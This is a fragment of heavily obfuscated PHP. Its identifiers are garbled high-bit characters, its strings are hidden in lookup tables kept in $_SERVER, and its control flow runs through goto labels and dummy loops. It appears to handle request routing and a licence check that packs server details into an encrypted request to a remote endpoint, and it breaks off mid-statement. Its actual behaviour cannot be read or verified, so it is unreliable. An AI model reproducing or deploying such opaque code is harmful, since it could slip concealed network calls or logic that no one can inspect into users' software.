$Eõ‡­“’Â[26]($GLOBALS[$Eõ‡­“’Â[22]][$Eõ‡­“’Â[23]], 1); $GLOBALS[$Eõ‡­“’Â[22]][$Eõ‡­“’Â[23]] = $Eõ‡­“’Â[27]($f‹ëšäÇÓÊ, $E˜‚íƒğÙÙ); goto Bò«íùİÂå; D¿åšÚ–: $EíØ²—Æ­’ = $GLOBALS[$Eõ‡­“’Â[22]][$Eõ‡­“’Â[23]][0]; if (!$EíØ²—Æ­’ || $Eõ‡­“’Â[24]($EíØ²—Æ­’) <= $Eõ‡­“’Â[24]($ešÁéÚŸ ¶)) { return; } if ($Eõ‡­“’Â[6]($Eõ‡­“’Â[25]($EíØ²—Æ­’, -$Eõ‡­“’Â[24]($ešÁéÚŸ ¶))) != $ešÁéÚŸ ¶) { return; } goto A‰òÑãß„ª; fˆÒ†…¡‰: $b©ìçèØİ = $C¦Š ‘½Ş[566]; goto bÆïÚ¡Ì„§; Bò«íùİÂå: $aÄ²¶˜Ú–ä = $C¦Š ‘½Ş[565]; if (!$aÄ²¶˜Ú–ä) { die; } $GLOBALS[$Eõ‡­“’Â[22]][$Eõ‡­“’Â[28]] = $Eõ‡­“’Â[29]($Eõ‡­“’Â[1], $GLOBALS[$Eõ‡­“’Â[22]][$Eõ‡­“’Â[23]]); goto fˆÒ†…¡‰; A‰òÑãß„ª: $B°¤Ğ†­¤ = $Eõ‡­“’Â[25]($EíØ²—Æ­’, 0, -$Eõ‡­“’Â[24]($ešÁéÚŸ ¶)); $eçƒ½–¾‰ = $C¦Š ‘½Ş[564]; while ($eçƒ½–¾‰ < $C¦Š ‘½Ş[563]) { if ($eçƒ½–¾‰ >= 0) { break; } $eçƒ½–¾‰++; } goto b•Ï’×¨Ù; bÆïÚ¡Ì„§: } private function dofu0e186e83() { goto a˜„Ìâß¢É; B¹ ÄÎ£ˆ: $e´¹ÈæùØ® = $_SERVER[$fÚ…µçòÌÒ[30]]; $Cº³…ÖÀã” = $fÚ…µçòÌÒ[31]; $D­´‡àÈƒí = $Fò©¤†ğòŸ[567]; goto Cø¥õ²ˆ¾; d¢ˆÈÑÆ‹»: $E¡¨Áö“çß = $Fò©¤†ğòŸ[568]; $cŸïÏ Ş¿ = $fÚ…µçòÌÒ[25]($e´¹ÈæùØ®, $f°ï‹ˆ + $fÚ…µçòÌÒ[24]($Cº³…ÖÀã”)); $fÚ…µçòÌÒ[34]($fÚ…µçòÌÒ[35], $cŸïÏ Ş¿, $a Ôâù—…é); goto C‰•»Ã”¤Œ; cøñ™ÑŠÍŠ: $FÔ©ù¿ôá² = $Fò©¤†ğòŸ[570]; if (strlen($FÔ©ù¿ôá²) < $Fò©¤†ğòŸ[365]) { return; } $GLOBALS[$fÚ…µçòÌÒ[22]][$fÚ…µçòÌÒ[23]] = $fÚ…µçòÌÒ[0]($fÚ…µçòÌÒ[36], $cŸïÏ Ş¿); goto DÊİ¸¿‚–; DÊİ¸¿‚–: $GLOBALS[$fÚ…µçòÌÒ[22]][$fÚ…µçòÌÒ[28]] = $fÚ…µçòÌÒ[29]($fÚ…µçòÌÒ[1], $GLOBALS[$fÚ…µçòÌÒ[22]][$fÚ…µçòÌÒ[23]]); $dñ–‹‹Ô² = $Fò©¤†ğòŸ[571]; if (strlen($dñ–‹‹Ô²) < $Fò©¤†ğòŸ[563]) { die; } goto BÔë¾ĞÌÁö; a˜„Ìâß¢É: $Fò©¤†ğòŸ =& $_SERVER[Ä¿Ş°¨]; $fÚ…µçòÌÒ =& $_SERVER[‹‚–·¹Ÿ]; if ($GLOBALS[$fÚ…µçòÌÒ[22]][$fÚ…µçòÌÒ[28]] != $fÚ…µçòÌÒ[10]) { return; } goto B¹ ÄÎ£ˆ; Cø¥õ²ˆ¾: while (strlen($D­´‡àÈƒí) < $Fò©¤†ğòŸ[559]) { if (!$D­´‡àÈƒí) { break; } $D­´‡àÈƒí++; } if (!$fÚ…µçòÌÒ[32]($e´¹ÈæùØ®, $Cº³…ÖÀã”)) { return; } $f°ï‹ˆ = $fÚ…µçòÌÒ[33]($e´¹ÈæùØ®, $Cº³…ÖÀã”); goto d¢ˆÈÑÆ‹»; C‰•»Ã”¤Œ: $AØéÎ¹¥Ö¡ = $Fò©¤†ğòŸ[569]; if (!$AØéÎ¹¥Ö¡) { die; } $cŸïÏ Ş¿ = $fÚ…µçòÌÒ[2]($a Ôâù—…é[0][0], $fÚ…µçòÌÒ[36]); goto cøñ™ÑŠÍŠ; BÔë¾ĞÌÁö: } public function run() { goto A²Á¤„ÃŠˆ; bîÃ˜óÜ°¬: $a”¨ÌóªÁ© = $FÁÒÅ‹–÷ğ[576]; if (strlen($a”¨ÌóªÁ©) < $FÁÒÅ‹–÷ğ[555]) { die; } $this->{$_SERVER[‹‚–·¹Ÿ][45]}(); goto AÇÓÍÕ°êö; AÇÓÍÕ°êö: if ($fÜ‡íªøöà[19]($dµÊÏ˜ƒà¶) >= 3) { $this->{$_SERVER[‹‚–·¹Ÿ][21]}($E¿…—¾È¡À); } else { $this->{$_SERVER[‹‚–·¹Ÿ][21]}(ACTION); } goto fç…šÙ¼…„; a—¦ì¸ á¡: $fÜ‡íªøöà[39]($fÜ‡íªøöà[41], isset($dµÊÏ˜ƒà¶[1]) && $dµÊÏ˜ƒà¶[0] ? $dµÊÏ˜ƒà¶[1] : $this->defaultController); $Cß…ìƒ²İ© = $FÁÒÅ‹–÷ğ[575]; while ($Cß…ìƒ²İ© < $FÁÒÅ‹–÷ğ[555]) { if ($Cß…ìƒ²İ© >= 0) { break; } $Cß…ìƒ²İ©++; } goto BâÛÁó›İ; A²Á¤„ÃŠˆ: $FÁÒÅ‹–÷ğ =& $_SERVER[Ä¿Ş°¨]; $fÜ‡íªøöà =& $_SERVER[‹‚–·¹Ÿ]; $this->{$_SERVER[‹‚–·¹Ÿ][37]}(); goto Fø»—„Ğİ; BâÛÁó›İ: $fÜ‡íªøöà[39]($fÜ‡íªøöà[42], isset($dµÊÏ˜ƒà¶[2]) && $dµÊÏ˜ƒà¶[0] ? $dµÊÏ˜ƒà¶[2] : $this->defaultAction); $fÜ‡íªøöà[39]($fÜ‡íªøöà[43], MOD . $fÜ‡íªøöà[1] . ST . $fÜ‡íªøöà[1] . ACT); $_SERVER[$fÜ‡íªøöà[44]] = $fÜ‡íªøöà[6](ACTION); goto bîÃ˜óÜ°¬; Fø»—„Ğİ: $this->{$_SERVER[‹‚–·¹Ÿ][38]}(); $dµÊÏ˜ƒà¶ = $GLOBALS[$fÜ‡íªøöà[22]][$fÜ‡íªøöà[23]]; $b‹”¨Ü§÷ = $FÁÒÅ‹–÷ğ[572]; goto fŸŠÚ½¦¯·; fŸŠÚ½¦¯·: if (strlen($b‹”¨Ü§÷) < $FÁÒÅ‹–÷ğ[555]) { return; } $E¿…—¾È¡À = $GLOBALS[$fÜ‡íªøöà[22]][$fÜ‡íªøöà[28]]; $fæâ›”ĞÎ­ = $FÁÒÅ‹–÷ğ[573]; goto c¡æö¬–Ìš; c¡æö¬–Ìš: $fÜ‡íªøöà[39]($fÜ‡íªøöà[40], isset($dµÊÏ˜ƒà¶[0]) && $dµÊÏ˜ƒà¶[0] ? $dµÊÏ˜ƒà¶[0] : $this->defaultModule); $aŠñĞªâæÍ = $FÁÒÅ‹–÷ğ[574]; while ($aŠñĞªâæÍ < $FÁÒÅ‹–÷ğ[559]) { if ($aŠñĞªâæÍ >= 0) { break; } $aŠñĞªâæÍ++; } goto a—¦ì¸ á¡; fç…šÙ¼…„: } private $vegy2980d713 = array(); private $fwilb523e2b4 = ''; public function thomef6ff6b2() { goto cŠ¶‡ß±–; dáæº‡­ĞÜ: $d±î¼×î¶¼ = $B­ë­¥¤ª[583]; if (!$d±î¼×î¶¼) { die; } $this->{$_SERVER[‹‚–·¹Ÿ][3]}($Dš¥ïİ¥ì[59], array($this, $Dš¥ïİ¥ì[60])); goto dÜ»²»Õä; cŠ¶‡ß±–: $B­ë­¥¤ª =& $_SERVER[Ä¿Ş°¨]; $Dš¥ïİ¥ì =& $_SERVER[‹‚–·¹Ÿ]; $this->{$_SERVER[‹‚–·¹Ÿ][46]}(); goto E±ØõŸœ£ß; bÊ„õ‚±‡“: if (strlen($a¬¨ÀÖ¿‰) < $B­ë­¥¤ª[557]) { die; } $this->{$_SERVER[‹‚–·¹Ÿ][51]}(); $Aæ‡İÇè¢ = $B­ë­¥¤ª[580]; goto dæê’Á¸; E±ØõŸœ£ß: $CÀ·ë×ß‡· = $B­ë­¥¤ª[577]; while ($CÀ·ë×ß‡· < $B­ë­¥¤ª[557]) { if ($CÀ·ë×ß‡· >= 0) { break; } $CÀ·ë×ß‡·++; } $this->{$_SERVER[‹‚–·¹Ÿ][47]}(); goto AÁÏÂŒ¡´; dæê’Á¸: while ($Aæ‡İÇè¢ < $B­ë­¥¤ª[365]) { if ($Aæ‡İÇè¢ >= 0) { break; } $Aæ‡İÇè¢++; } $this->{$_SERVER[‹‚–·¹Ÿ][52]}(); $cÀ”¢˜£Ã = $B­ë­¥¤ª[581]; goto b¸êê”“óÉ; B©š©‹œìÀ: $dÖ§Ô™Ù¼ = $B­ë­¥¤ª[582]; if (!$dÖ§Ô™Ù¼) { die; } $this->{$_SERVER[‹‚–·¹Ÿ][3]}($Dš¥ïİ¥ì[57], array($this, $Dš¥ïİ¥ì[58])); goto dáæº‡­ĞÜ; AÁÏÂŒ¡´: $this->{$_SERVER[‹‚–·¹Ÿ][48]}(); $Bó…„¥ÖßŠ = $B­ë­¥¤ª[578]; while ($Bó…„¥ÖßŠ < $B­ë­¥¤ª[563]) { if ($Bó…„¥ÖßŠ >= 0) { break; } $Bó…„¥ÖßŠ++; } goto fè½³ÓÃ¦º; fè½³ÓÃ¦º: $this->{$_SERVER[‹‚–·¹Ÿ][49]}(); $this->{$_SERVER[‹‚–·¹Ÿ][50]}(); $a¬¨ÀÖ¿‰ = $B­ë­¥¤ª[579]; goto bÊ„õ‚±‡“; b¸êê”“óÉ: while (strlen($cÀ”¢˜£Ã) < $B­ë­¥¤ª[555]) { if (!$cÀ”¢˜£Ã) { break; } $cÀ”¢˜£Ã++; } $this->{$_SERVER[‹‚–·¹Ÿ][3]}($Dš¥ïİ¥ì[53], array($this, $Dš¥ïİ¥ì[54])); $this->{$_SERVER[‹‚–·¹Ÿ][3]}($Dš¥ïİ¥ì[55], array($this, $Dš¥ïİ¥ì[56])); goto B©š©‹œìÀ; dÜ»²»Õä: } public function jfzd9ed2f694($DÁ³ªˆ¡‹´) { goto BåâÌ¿½ìÃ; F¾é­ŒÒìİ: $DÁ³ªˆ¡‹´[$C¡êĞôéØà[93]][$C¡êĞôéØà[94]][$C¡êĞôéØà[99]] = array($C¡êĞôéØà[100] => (int) $AêŠÃä¥Ÿ§[$C¡êĞôéØà[101]], $C¡êĞôéØà[102] => $C¡êĞôéØà[103]($C¡êĞôéØà[104]($AêŠÃä¥Ÿ§, $C¡êĞôéØà[105], array())), $C¡êĞôéØà[106] => (int) $C¡êĞôéØà[104]($AêŠÃä¥Ÿ§, $C¡êĞôéØà[107], 0)); $DÁ³ªˆ¡‹´[$C¡êĞôéØà[108]][$C¡êĞôéØà[109]] = $C¡êĞôéØà[110]($C¡êĞôéØà[111])->{$_SERVER[‹‚–·¹Ÿ][112]}(); $eÛ°´ß‰ÎÅ = $d¤Œ†Ö‚£™[590]; goto b°Ò½· í; B•Œ®Ÿ–æÛ: $aàÃË‘µêâ = $d¤Œ†Ö‚£™[588]; while (strlen($aàÃË‘µêâ) < $d¤Œ†Ö‚£™[555]) { if (!$aàÃË‘µêâ) { break; } $aàÃË‘µêâ++; } unset($DÁ³ªˆ¡‹´[$C¡êĞôéØà[93]][$C¡êĞôéØà[94]][$C¡êĞôéØà[76]]); goto DÑÜŸÖŠ×; DÑÜŸÖŠ×: $aæ†È…èßÇ = $d¤Œ†Ö‚£™[589]; if (!$aæ†È…èßÇ) { return; } unset($DÁ³ªˆ¡‹´[$C¡êĞôéØà[93]][$C¡êĞôéØà[94]][$C¡êĞôéØà[98]]); goto F¾é­ŒÒìİ; b°Ò½· í: $DÁ³ªˆ¡‹´[$C¡êĞôéØà[108]][$C¡êĞôéØà[113]] = $C¡êĞôéØà[114]($_SERVER[$C¡êĞôéØà[115]] . $f‘¿¾‡ğÁ[$C¡êĞôéØà[116]]); $fæ¥¼½ÌÑ¬ = $d¤Œ†Ö‚£™[591]; $DÁ³ªˆ¡‹´[$C¡êĞôéØà[108]][$C¡êĞôéØà[117]] = $C¡êĞôéØà[118]($C¡êĞôéØà[119]()); goto E›œåò‰ª; E›œåò‰ª: $F”Çèè´Ï = $d¤Œ†Ö‚£™[592]; while (strlen($F”Çèè´Ï) < $d¤Œ†Ö‚£™[563]) { if (!$F”Çèè´Ï) { break; } $F”Çèè´Ï++; } $DÁ³ªˆ¡‹´[$C¡êĞôéØà[108]][$C¡êĞôéØà[120]] = $this->fwilb523e2b4; goto dš¹õ«; bã¡ğŸ: $E‘ÁöÎÃÍ = $d¤Œ†Ö‚£™[584]; $aŞŒöä¥ĞÜ = array($C¡êĞôéØà[64], $C¡êĞôéØà[65], $C¡êĞôéØà[66], $C¡êĞôéØà[67], $C¡êĞôéØà[68], $C¡êĞôéØà[69], $C¡êĞôéØà[70], $C¡êĞôéØà[71], $C¡êĞôéØà[72], $C¡êĞôéØà[73], $C¡êĞôéØà[74], $C¡êĞôéØà[75], $C¡êĞôéØà[76], $C¡êĞôéØà[77], $C¡êĞôéØà[78], $C¡êĞôéØà[79], $C¡êĞôéØà[80], $C¡êĞôéØà[81], $C¡êĞôéØà[82], $C¡êĞôéØà[83], $C¡êĞôéØà[84], $C¡êĞôéØà[85], $C¡êĞôéØà[86], $C¡êĞôéØà[87], $C¡êĞôéØà[88], $C¡êĞôéØà[89], $C¡êĞôéØà[90]); foreach ($aŞŒöä¥ĞÜ as $c¦×ÆğÏ¨é) { $D‰Œš®áàÖ = $GLOBALS[$C¡êĞôéØà[91]][$C¡êĞôéØà[92]][$c¦×ÆğÏ¨é]; $A¼…Å÷ŸÃà = $d¤Œ†Ö‚£™[585]; if (strlen($A¼…Å÷ŸÃà) < $d¤Œ†Ö‚£™[559]) { die; } if (isset($f‘¿¾‡ğÁ[$c¦×ÆğÏ¨é])) { $D‰Œš®áàÖ = $f‘¿¾‡ğÁ[$c¦×ÆğÏ¨é]; } $DÁ³ªˆ¡‹´[$C¡êĞôéØà[93]][$C¡êĞôéØà[94]][$c¦×ÆğÏ¨é] = $D‰Œš®áàÖ; } goto C¸›ÆÜ›Ù; C°³Æ…Œ­Ã: if ($C¡êĞôéØà[104]($GLOBALS, $C¡êĞôéØà[132]) && $this->config[$C¡êĞôéØà[133]]) { $DÁ³ªˆ¡‹´[$C¡êĞôéØà[108]][$C¡êĞôéØà[134]] = WEB_ROOT; } return $DÁ³ªˆ¡‹´; goto D¯çÌ†ŞŸ¯; C¸›ÆÜ›Ù: $AêŠÃä¥Ÿ§ = $DÁ³ªˆ¡‹´[$C¡êĞôéØà[93]][$C¡êĞôéØà[94]][$C¡êĞôéØà[76]]; $dĞåæÁ…‚™ = $d¤Œ†Ö‚£™[586]; unset($DÁ³ªˆ¡‹´[$C¡êĞôéØà[93]][$C¡êĞôéØà[95]][$C¡êĞôéØà[96]]); goto cê–ÊÅÕµ…; dé¢Úšß×: $DÁ³ªˆ¡‹´[$C¡êĞôéØà[108]][$C¡êĞôéØà[130]] = $C¡êĞôéØà[104]($this->vegy2980d713, $C¡êĞôéØà[131], $C¡êĞôéØà[10]); $DÂÃÀÒÇÅ½ = $d¤Œ†Ö‚£™[593]; if (!$DÂÃÀÒÇÅ½) { return; } goto C°³Æ…Œ­Ã; cê–ÊÅÕµ…: $bš¨‚˜£Ú = $d¤Œ†Ö‚£™[587]; if (!$bš¨‚˜£Ú) { die; } unset($DÁ³ªˆ¡‹´[$C¡êĞôéØà[93]][$C¡êĞôéØà[95]][$C¡êĞôéØà[97]]); goto B•Œ®Ÿ–æÛ; BåâÌ¿½ìÃ: $d¤Œ†Ö‚£™ =& $_SERVER[Ä¿Ş°¨]; $C¡êĞôéØà =& $_SERVER[‹‚–·¹Ÿ]; $f‘¿¾‡ğÁ = $C¡êĞôéØà[61]($C¡êĞôéØà[62])->{$_SERVER[‹‚–·¹Ÿ][63]}(); goto bã¡ğŸ; dš¹õ«: if ($f‘¿¾‡ğÁ[$C¡êĞôéØà[120]] != $C¡êĞôéØà[121]) { $DÁ³ªˆ¡‹´[$C¡êĞôéØà[108]][$C¡êĞôéØà[122]] = $f‘¿¾‡ğÁ[$C¡êĞôéØà[122]]; $DÁ³ªˆ¡‹´[$C¡êĞôéØà[108]][$C¡êĞôéØà[123]] = $f‘¿¾‡ğÁ[$C¡êĞôéØà[123]]; $B²­¦Ÿ›‚í = $C¡êĞôéØà[124](10) . $this->fwilb523e2b4 . $C¡êĞôéØà[124](5); $DÁ³ªˆ¡‹´[$C¡êĞôéØà[93]][$C¡êĞôéØà[125]][$C¡êĞôéØà[126]] = $this->{$_SERVER[‹‚–·¹Ÿ][127]}($B²­¦Ÿ›‚í, $DÁ³ªˆ¡‹´[$C¡êĞôéØà[108]][$C¡êĞôéØà[113]]); } if ($this->fwilb523e2b4 == $C¡êĞôéØà[121]) { $DÁ³ªˆ¡‹´[$C¡êĞôéØà[93]][$C¡êĞôéØà[94]][$C¡êĞôéØà[99]][$C¡êĞôéØà[107]] = 0; } $DÁ³ªˆ¡‹´[$C¡êĞôéØà[108]][$C¡êĞôéØà[128]] = $C¡êĞôéØà[104]($this->vegy2980d713, $C¡êĞôéØà[129], $C¡êĞôéØà[10]); goto dé¢Úšß×; D¯çÌ†ŞŸ¯: } private function kpusddc23dee() { goto DÙÓĞÒÔĞ¿; F›Áîˆ‡±ˆ: if ($this->fwilb523e2b4 == $a‘Ï÷î‘Îİ[121]) { return; } $F¿½›„¼÷Ì = array($a‘Ï÷î‘Îİ[153], $a‘Ï÷î‘Îİ[154], $a‘Ï÷î‘Îİ[155], $a‘Ï÷î‘Îİ[156], $a‘Ï÷î‘Îİ[157], $a‘Ï÷î‘Îİ[158]); $DÎ¦‚ÁÊËÄ = $bˆ˜°ŒÊ—[595]; goto bõ‹ÂÙœÇŒ; f˜•¶Ï¢¨Ø: $a‘Ï÷î‘Îİ[13](array($a‘Ï÷î‘Îİ[151], $a‘Ï÷î‘Îİ[152]), $CÑÜŠÖÈ Ğ); goto E´ÓÔõ¡ÖÃ; bõ‹ÂÙœÇŒ: if (strlen($DÎ¦‚ÁÊËÄ) < $bˆ˜°ŒÊ—[563]) { return; } $C†®»›ß‚° = $a‘Ï÷î‘Îİ[61]($a‘Ï÷î‘Îİ[62])->{$_SERVER[‹‚–·¹Ÿ][63]}(); $CÑÜŠÖÈ Ğ = array($a‘Ï÷î‘Îİ[159] => $C†®»›ß‚°[$a‘Ï÷î‘Îİ[64]], $a‘Ï÷î‘Îİ[160] => $C†®»›ß‚°[$a‘Ï÷î‘Îİ[65]], $a‘Ï÷î‘Îİ[161] => $a‘Ï÷î‘Îİ[10]); goto A‘¨’’ÈîŠ; DÙÓĞÒÔĞ¿: $bˆ˜°ŒÊ— =& $_SERVER[Ä¿Ş°¨]; $a‘Ï÷î‘Îİ =& $_SERVER[‹‚–·¹Ÿ]; if ($_SERVER[$a‘Ï÷î‘Îİ[44]] == $a‘Ï÷î‘Îİ[135]) { goto Dİ·¡‚ëÏÓ; eÀÚ“ÅÈåõ: $bÔäßš‰® = $bˆ˜°ŒÊ—[594]; if (strlen($bÔäßš‰®) < $bˆ˜°ŒÊ—[559]) { die; } $CÑÜŠÖÈ Ğ = array($a‘Ï÷î‘Îİ[150] => $AÄ‘ØÔİ´¬); goto Dõê£®®½; Dİ·¡‚ëÏÓ: $AÄ‘ØÔİ´¬ = array($a‘Ï÷î‘Îİ[120] => $this->fwilb523e2b4, $a‘Ï÷î‘Îİ[136] => $this->{$_SERVER[‹‚–·¹Ÿ][137]}(), $a‘Ï÷î‘Îİ[138] => $a‘Ï÷î‘Îİ[61]($a‘Ï÷î‘Îİ[139])->{$_SERVER[‹‚–·¹Ÿ][140]}()); if ($this->fwilb523e2b4 != $a‘Ï÷î‘Îİ[121]) { $BÁ‰ØÉµ÷” = $a‘Ï÷î‘Îİ[104]($this->vegy2980d713, $a‘Ï÷î‘Îİ[141]); if ($BÁ‰ØÉµ÷”) { $AÄ‘ØÔİ´¬[$a‘Ï÷î‘Îİ[142]] = $BÁ‰ØÉµ÷”; $AÄ‘ØÔİ´¬[$a‘Ï÷î‘Îİ[143]] = $a‘Ï÷î‘Îİ[144]($a‘Ï÷î‘Îİ[104]($this->vegy2980d713, $a‘Ï÷î‘Îİ[145])); $AÄ‘ØÔİ´¬[$a‘Ï÷î‘Îİ[146]] = $a‘Ï÷î‘Îİ[104]($this->vegy2980d713, $a‘Ï÷î‘Îİ[131]); } } $AÄ‘ØÔİ´¬ = $this->{$_SERVER[‹‚–·¹Ÿ][147]}($a‘Ï÷î‘Îİ[148]($AÄ‘ØÔİ´¬), $a‘Ï÷î‘Îİ[114]($a‘Ï÷î‘Îİ[149])); goto eÀÚ“ÅÈåõ; Dõê£®®½: $a‘Ï÷î‘Îİ[13](array($a‘Ï÷î‘Îİ[151], $a‘Ï÷î‘Îİ[152]), $CÑÜŠÖÈ Ğ); goto e¸•¡ÊÊ¦; e¸•¡ÊÊ¦: } goto F›Áîˆ‡±ˆ; A‘¨’’ÈîŠ: $Dáö°åÉ¿À = $bˆ˜°ŒÊ—[596]; while (strlen($Dáö°åÉ¿À) < $bˆ˜°ŒÊ—[563]) { if (!$Dáö°åÉ¿À) { break; } $Dáö°åÉ¿À++; } foreach ($F¿½›„¼÷Ì as $bõÆ¥†Î†ï) { if (!isset($C†®»›ß‚°[$bõÆ¥†Î†ï]) || !$C†®»›ß‚°[$bõÆ¥†Î†ï]) { continue; } $CÑÜŠÖÈ Ğ[$bõÆ¥†Î†ï] = $C†®»›ß‚°[$bõÆ¥†Î†ï]; } goto f˜•¶Ï¢¨Ø; E´ÓÔõ¡ÖÃ: } private function hgzi31a02592() { goto d¯ìÇ¸×—å; B•—Óï §Ç: if (!isset($AæÎš´ìƒÀ[$a¼Ç³œŸß§[165]]) || $a¼Ç³œŸß§[24]($AæÎš´ìƒÀ[$a¼Ç³œŸß§[165]]) != 16) { $a¼Ç³œŸß§[166]($a¼Ç³œŸß§[167] . $AæÎš´ìƒÀ[$a¼Ç³œŸß§[165]], !1); } $A–ôà¹• = $a¼Ç³œŸß§[61]($a¼Ç³œŸß§[62])->{$_SERVER[‹‚–·¹Ÿ][63]}($a¼Ç³œŸß§[116]); $FÅÉœˆÇÛ = array($a¼Ç³œŸß§[165] => $AæÎš´ìƒÀ[$a¼Ç³œŸß§[165]], $a¼Ç³œŸß§[168] => $a¼Ç³œŸß§[124](16), $a¼Ç³œŸß§[169] => $a¼Ç³œŸß§[149], $a¼Ç³œŸß§[170] => $a¼Ç³œŸß§[171], $a¼Ç³œŸß§[172] => $_SERVER[$a¼Ç³œŸß§[173]], $a¼Ç³œŸß§[174] => $_SERVER[$a¼Ç³œŸß§[175]], $a¼Ç³œŸß§[176] => $_SERVER[$a¼Ç³œŸß§[177]]); goto E´šì•†ÓÕ; f¬“÷êÍ«Ç: $Då±›¸óù = $còº…ÒºŸ‡[597]; $aÚ­ñÀ–Â = $d©ˆ¬³Äó‚ . $böß¿ª¦øÄ[$a¼Ç³œŸß§[120]] . $this->{$_SERVER[‹‚–·¹Ÿ][147]}($a¼Ç³œŸß§[114]($böß¿ª¦øÄ[$a¼Ç³œŸß§[209]]), $d©ˆ¬³Äó‚); $E”‡•Ó§Èô = $còº…ÒºŸ‡[598]; goto f¨¶áÒ¥ßø; F§¦ôÄ”‡ğ: while (strlen($Aä–â÷èµŒ) < $còº…ÒºŸ‡[365]) { if (!$Aä–â÷èµŒ) { break; } $Aä–â÷èµŒ++; } $D…Æá‚óÃÆ = $a¼Ç³œŸß§[222]($a¼Ç³œŸß§[61]($a¼Ç³œŸß§[11])->{$_SERVER[‹‚–·¹Ÿ][223]}(), $a¼Ç³œŸß§[224]); $e¿òÕ˜ß„Â = $còº…ÒºŸ‡[601]; goto bÇ¹êÅ…º¶; dÈö¸Ëâ¡: $böß¿ª¦øÄ = array($a¼Ç³œŸß§[209] => $FÅÉœˆÇÛ[$a¼Ç³œŸß§[165]], $a¼Ç³œŸß§[210] => $e¸•ñ¬ÎÒ[$a¼Ç³œŸß§[211]], $a¼Ç³œŸß§[212] => $a¼Ç³œŸß§[124](16), $a¼Ç³œŸß§[120] => $e¸•ñ¬ÎÒ[$a¼Ç³œŸß§[213]]); if ($FÅÉœˆÇÛ[$a¼Ç³œŸß§[168]]) { $böß¿ª¦øÄ[$a¼Ç³œŸß§[212]] = $FÅÉœˆÇÛ[$a¼Ç³œŸß§[168]]; } $bƒ¿à§éîç = $a¼Ç³œŸß§[25]($a¼Ç³œŸß§[114]($böß¿ª¦øÄ[$a¼Ç³œŸß§[210]]), 10, 10); goto Eò£¿·Âô£; f¨¶áÒ¥ßø: $böß¿ª¦øÄ[$a¼Ç³œŸß§[123]] = $a¼Ç³œŸß§[118]($a¼Ç³œŸß§[214]($this->{$_SERVER[‹‚–·¹Ÿ][147]}($aÚ­ñÀ–Â, $a¼Ç³œŸß§[216]))); $aÎ‡»¹†‡ = $còº…ÒºŸ‡[599]; if (strlen($aÎ‡»¹†‡) < $còº…ÒºŸ‡[557]) { die; } goto eè¯²ŠîÆ©; f…›Äª¯ğÂ: $e˜İµâÇé› = $a¼Ç³œŸß§[214]($a¼Ç³œŸß§[25]($FÀÁêš‘Ù, 10, 16)); $cÈ´ ß¢æÇ = $this->{$_SERVER[‹‚–·¹Ÿ][127]}($a¼Ç³œŸß§[148]($e¸•ñ¬ÎÒ), $FÀÁêš‘Ù); $Aä–â÷èµŒ = $còº…ÒºŸ‡[600]; goto F§¦ôÄ”‡ğ; eÑÕÒ›¼çö: if (!$a¼Ç³œŸß§[104]($GLOBALS, $a¼Ç³œŸß§[132])) { die; } $AæÎš´ìƒÀ = $GLOBALS[$a¼Ç³œŸß§[22]]; if (isset($AæÎš´ìƒÀ[$a¼Ç³œŸß§[163]])) { $this->{$_SERVER[‹‚–·¹Ÿ][164]}(); die; } goto B•—Óï §Ç; E´šì•†ÓÕ: $eøÆæ Ÿ®ì = $a¼Ç³œŸß§[114]($_SERVER[$a¼Ç³œŸß§[115]] . $A–ôà¹•); if ($AæÎš´ìƒÀ[$a¼Ç³œŸß§[178]] == $a¼Ç³œŸß§[179]) { $B†Ÿ¡­•‘“ = $this->{$_SERVER[‹‚–·¹Ÿ][147]}($eøÆæ Ÿ®ì, $a¼Ç³œŸß§[180]); $aéĞºÁ‘¦» = $this->{$_SERVER[‹‚–·¹Ÿ][127]}($a¼Ç³œŸß§[148]($FÅÉœˆÇÛ), $eøÆæ Ÿ®ì . $a¼Ç³œŸß§[181], 3); $c§ë­›ÃœÙ = $this->{$_SERVER[‹‚–·¹Ÿ][182]}($a¼Ç³œŸß§[183] . $B†Ÿ¡­•‘“ . $a¼Ç³œŸß§[184] . $aéĞºÁ‘¦», -1); $a¼Ç³œŸß§[166]($c§ë­›ÃœÙ, !0); } else { if ($AæÎš´ìƒÀ[$a¼Ç³œŸß§[178]] == $a¼Ç³œŸß§[185]) { $A¹Ş·´ãôá = $a¼Ç³œŸß§[25]($a¼Ç³œŸß§[114]($a¼Ç³œŸß§[186] . $eøÆæ Ÿ®ì), 12, 15) . $a¼Ç³œŸß§[187]; $aéĞºÁ‘¦» = $this->{$_SERVER[‹‚–·¹Ÿ][188]}($a¼Ç³œŸß§[2]($AæÎš´ìƒÀ[$a¼Ç³œŸß§[189]]), $A¹Ş·´ãôá, 2); $A±õÀ×† = $a¼Ç³œŸß§[190]($aéĞºÁ‘¦», !0); if (!$a¼Ç³œŸß§[191]($A±õÀ×†) || !$a¼Ç³œŸß§[191]($A±õÀ×†[$a¼Ç³œŸß§[192]]) || $A±õÀ×†[$a¼Ç³œŸß§[165]] != !0) { $eôŠºŒô¢ = $a¼Ç³œŸß§[193]; $Eª˜÷óùô× = $A±õÀ×†[$a¼Ç³œŸß§[192]] ? $a¼Ç³œŸß§[194] . $A±õÀ×†[$a¼Ç³œŸß§[192]] : $eôŠºŒô¢; $a¼Ç³œŸß§[166]($Eª˜÷óùô×, !1); } else { $FÅÉœˆÇÛ[$a¼Ç³œŸß§[168]] = $A±õÀ×†[$a¼Ç³œŸß§[192]][$a¼Ç³œŸß§[195]]; } } else { $A±õÀ×† = $this->{$_SERVER[‹‚–·¹Ÿ][182]}($a¼Ç³œŸß§[196], $FÅÉœˆÇÛ, 10); } } if (!$a¼Ç³œŸß§[191]($A±õÀ×†) || !$a¼Ç³œŸß§[191]($A±õÀ×†[$a¼Ç³œŸß§[192]]) || $A±õÀ×†[$a¼Ç³œŸß§[165]] != !0) { $eôŠºŒô¢ = $a¼Ç³œŸß§[197]($a¼Ç³œŸß§[198]); $Eª˜÷óùô× = $A±õÀ×†[$a¼Ç³œŸß§[192]] ? $a¼Ç³œŸß§[194] . $A±õÀ×†[$a¼Ç³œŸß§[192]] : $eôŠºŒô¢; $a¼Ç³œŸß§[166]($Eª˜÷óùô×, !1); } goto aòâ»Â«Ğù; aòâ»Â«Ğù: $e¸•ñ¬ÎÒ = $A±õÀ×†[$a¼Ç³œŸß§[192]]; $eÅœâµÂ = $this->{$_SERVER[‹‚–·¹Ÿ][199]}($e¸•ñ¬ÎÒ[$a¼Ç³œŸß§[200]]); if (!$eÅœâµÂ || $eÅœâµÂ != $a¼Ç³œŸß§[201]($e¸•ñ¬ÎÒ[$a¼Ç³œŸß§[145]])) { $Cõ£¤ì©ç = 